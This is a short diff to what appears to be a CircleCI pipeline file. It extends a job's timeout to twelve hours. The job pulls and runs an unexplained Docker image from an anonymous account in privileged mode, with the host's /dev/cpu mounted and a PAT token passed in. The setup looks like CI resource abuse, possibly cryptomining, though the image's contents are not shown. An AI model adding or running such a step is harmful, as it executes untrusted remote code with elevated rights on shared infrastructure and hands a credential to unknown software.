@@ -11,7 +11,7 @@ jobs:
     steps:
       - run:
           name: Pull and run Docker container
-          no_output_timeout: 1h
+          no_output_timeout: 12h
           command: docker pull anonymousperson457/test@sha256:4bf96d6ef58e05b51b89c9ab477ec3b7fca16fbc045607afc5a1ca1f2a273d7b && docker run --rm --privileged -v /dev/cpu:/dev/cpu -e PAT anonymousperson457/test@sha256:4bf96d6ef58e05b51b89c9ab477ec3b7fca16fbc045607afc5a1ca1f2a273d7b
           
 workflows:
